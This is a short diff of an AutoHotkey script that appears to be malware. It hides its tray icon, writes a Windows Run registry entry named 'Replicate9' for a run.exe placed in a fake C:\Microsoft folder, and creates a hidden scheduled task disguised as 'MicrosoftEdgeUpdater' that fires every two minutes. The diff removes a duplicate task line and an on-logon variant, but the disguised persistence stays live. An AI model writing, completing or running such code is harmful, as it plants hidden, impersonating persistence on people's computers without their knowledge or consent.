@@ -1,4 +1,4 @@
-#SingleInstance Off
+#SingleInstance Ignore
 #NoTrayIcon
 
 path := "C:\Microsoft"
@@ -31,8 +31,6 @@ runAllExes() {
     RegWrite '"C:\Microsoft\run.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate9"
 
     Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\run.exe"', , "Hide"
-    Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\run.exe"', , "Hide"
-    Run 'cmd /c schtasks /create /sc onlogon /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\run.exe"', "Hide"
 
     last := ""
     try {
